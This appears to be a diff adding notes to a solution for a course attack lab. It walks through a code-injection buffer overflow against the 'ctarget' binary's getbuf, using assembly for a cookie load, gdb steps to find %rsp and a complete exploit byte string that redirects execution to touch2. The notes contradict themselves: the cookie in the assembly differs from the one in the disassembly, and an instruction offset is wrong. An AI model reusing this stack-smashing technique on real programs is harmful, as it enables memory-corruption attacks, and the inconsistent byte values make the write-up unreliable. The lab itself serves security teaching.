@@ -261,3 +261,50 @@ c9 1d 40 00 00 00 00 00 /*lea add_xy*/
 a1 1d 40 00 00 00 00 00
 eb 1c 40 00 00 00 00 00 /*touch 3 address */
 31 33 30 63 34 37 63 37 /* cookie as string */
+
+****************************************************************************************
+
+movq $0x130c47c7,%rdi /* move your cookie to register %rdi */
+retq                  /* return */
+
+compile this with gcc then dissasemble it
+gcc -c phase2.s
+objdump -d phase2.o  > phase2.d 
+open the file phase2.d and we get
+
+Disassembly of section .text:
+0000000000000000 <.text>:
+   0:	48 c7 c7 70 4b 4b 43 	mov    $0x434b4b70,%rdi
+   c:	c3                   	retq   
+
+byte representation of the assembly code is 48 c7 c7 70 4b 4b 43 c3
+
+find the address of rsp register
+
+gdb ctarget
+
+b getbuf
+
+run ctarget
+
+r
+
+disas
+
+   0x000000000040182c <+0>:	  sub    $0x18,%rsp
+   0x0000000000401830 <+4>:	  mov    %rsp,%rdi
+   0x0000000000401833 <+7>:	  callq  0x401ab6 <Gets>
+=> 0x0000000000401838 <+12>:	mov    $0x1,%eax
+   0x000000000040183d <+17>:	add    $0x18,%rsp
+   0x0000000000401841 <+21>:	retq   
+
+input the string 
+
+x/s $rsp
+
+48 c7 c7 70 4b 4b 43 c3 /*this sets your cookie*/
+00 00 00 00 00 00 00 00 padding
+00 00 00 00 00 00 00 00  ''
+d8 0c 62 55 00 00 00 00 /* address of register %rsp */
+8c 17 40 00 00 00 00 00 /*address of touch2 function */
+
